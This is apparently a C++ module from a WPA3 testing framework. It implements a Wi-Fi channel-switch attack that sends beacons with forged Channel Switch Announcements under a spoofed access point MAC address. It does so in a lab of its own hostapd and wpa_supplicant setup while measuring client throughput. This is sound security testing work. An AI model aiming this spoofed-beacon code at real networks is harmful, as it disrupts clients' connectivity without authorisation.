#include "attacks/channel_switch/channel_switch.h"
#include "logger/error_log.h"
#include <cassert>
#include "ex_program/hostapd/hostpad.h"
#include "logger/log.h"
#include <thread>
#include <chrono>
#include "system/hw_capabilities.h"
#include <filesystem>

#include "ex_program/ip/ip.h"

namespace wpa3_tester{
    using namespace std;
    using namespace Tins;

    void send_CSA_beacon(const HWAddress<6> &ap_mac,
                         const NetworkInterface &iface,
                         const string &ssid,
                         const int ap_channel,
                         const int new_channel) {

        Dot11Beacon beacon;
        beacon.addr1(Dot11::BROADCAST);
        beacon.addr2(ap_mac);
        beacon.addr3(ap_mac);
        beacon.ssid(ssid);
        beacon.ds_parameter_set(ap_channel);

        Dot11ManagementFrame::channel_switch_type cs;
        cs.switch_mode = 1;
        cs.new_channel = new_channel;
        cs.switch_count = 3;
        beacon.channel_switch(cs);

        RadioTap radiotap;
        const int freq_mhz = hw_capabilities::channel_to_freq_mhz(ap_channel);
        radiotap.channel(freq_mhz, RadioTap::OFDM);
        radiotap.inner_pdu(beacon);

        PacketSender sender;
        sender.send(radiotap, iface);
    }

    auto check_vulnerable(
        const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
        const string &iface_name, const string &ssid,
        const int ap_channel, const int new_channel,
        const int ms_interval,const int attack_time)->void{

        const NetworkInterface iface(iface_name);
        const auto start_time = chrono::steady_clock::now();
        const auto end_time = start_time + chrono::seconds(attack_time);

        while (chrono::steady_clock::now() < end_time) {
            log(LogLevel::DEBUG, "sending CSA");
            send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
            this_thread::sleep_for(chrono::milliseconds(ms_interval));
            //debug_step();
        }

        cout << "check_vulnerable called with:\n"
                  << "AP MAC: " << ap_mac << "\n"
                  << "STA MAC: " << sta_mac << "\n"
                  << "Interface: " << iface_name << "\n"
                  << "Channel: " << ap_channel << "\n"
                  << "SSID: " << ssid << endl;
    }

    void speed_observation_start(RunStatus& rs){
        namespace fs = filesystem;

        const fs::path obs_dir = fs::path(rs.run_folder) / "observer" / "iperf3";
        error_code ec;
        fs::create_directories(obs_dir, ec);
        if (ec) {
            log(LogLevel::ERROR,
                "Failed to create iperf3 observer dir %s: %s",
                obs_dir.string().c_str(), ec.message().c_str());
        }
        /*
        rs.process_manager.run("iperf3_server",{
            "stdbuf", "-oL", "-eL",
            "iperf3",
            "-s",
            //"-1",
            "-i","0.1",
            "-B", "10.0.0.1",   // explicit bind
            "-f", "k",
            //"-J"
            //"--logfile","iperf3_server.json"
        }, obs_dir);
        rs.process_manager.wait_for("iperf3_server", "Server listening");
        */
        //this_thread::sleep_for(chrono::seconds(5)); //TODO

        /*
        rs.process_manager.run("iperf3_client", {
            "ip", "netns", "exec", rs.config["actors"]["client"]["netns"].get<string>(),
            "stdbuf", "-oL", "-eL",
            "iperf3",
            "-c", "10.0.0.1",
            "-u", // udp, because is not buffered
            "-b", "10M",
            "-i","0.1",
            //"-B", "10.0.0.2",
            "--bind-dev", rs.get_actor("client")["iface"],
            "-t", to_string(rs.config["attack_config"]["attack_time"].get<int>()),
            "-f", "k",
            //"-J",
            //"--logfile","iperf_client.json"
        }, obs_dir);*/
        //run_mausezahn("client", "accesttpoint");
        //    rs.run_observer("mausezahn");
        rs.process_manager.run("mz_gen", {
            "ip", "netns", "exec", rs.config["actors"]["client"]["netns"].get<string>(),
            "mausezahn", rs.get_actor("client")["iface"],
            "-t", "udp", "sp=1234,dp=5201",
            "-A", "10.0.0.2", "-B", "10.0.0.1",
            "-p", "1250",  // 1250 bytes packet
            "-d", "1m",    // 1 milliseconds
            "-c", "0"      // not time limited
        }, obs_dir);


    };

    // ----------------- MODULE functions ------------------
    void setup_chs_attack(RunStatus& rs){

        if (rs.config["actors"]["access_point"]["source"] != "internal"
            || rs.config["actors"]["client"]["source"] != "internal") {
            throw runtime_error("only internal access_point is supported");
        }


        // -------- hostapd AP ------------
        run_hostapd(rs, "access_point");
        rs.process_manager.wait_for("access_point", "AP-ENABLED");
        log(LogLevel::INFO, "access_point is running");
        set_ip(rs, "access_point");  //TODO can be set before hostapd init?

        // -------- wpa_supplicant STA ------------
        run_wpa_supplicant(rs, "client");
        rs.process_manager.wait_for("client", "Successfully initialized wpa_supplicant");
        set_ip(rs, "client");

        rs.process_manager.wait_for("client", "EVENT-CONNECTED");
        rs.process_manager.wait_for("access_point", "EAPOL-4WAY-HS-COMPLETED");
        log(LogLevel::INFO, "client is connected");
    }


    void speed_observation_stop(RunStatus& rs){
        rs.process_manager.stop("iperf3_server");
        rs.process_manager.stop("iperf3_client");
    }

    void run_chs_attack(RunStatus& rs){

        const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
        const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
        const string iface_name = rs.get_actor("attacker")["iface"];
        const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
        const int old_channel = rs.config["actors"]["access_point"]["setup"]["channel"];
        const int new_channel = rs.config["attack_config"]["new_channel"];
        const int ms_interval = rs.config["attack_config"]["ms_interval"];
        const int attack_time = rs.config["attack_config"]["attack_time"];

        speed_observation_start(rs);
        this_thread::sleep_for(chrono::seconds(10));
        log(LogLevel::INFO, "Attack START");
        check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);//speed_observation_stop(rs);
        log(LogLevel::INFO, "Attack END");
        this_thread::sleep_for(chrono::seconds(10));
    }

    void stats_chs_attack(const RunStatus& rs){

        namespace fs = filesystem;
        const fs::path base = fs::path(rs.run_folder) / "observer" / "iperf3";
        //TODO
        //iperf3_graph(base / "iperf3_client.log", "iperf3_client", "iperf3_client.png");
        //iperf3_graph(base / "iperf3_server.log", "iperf3_server", "iperf3_server.png");
    }
}
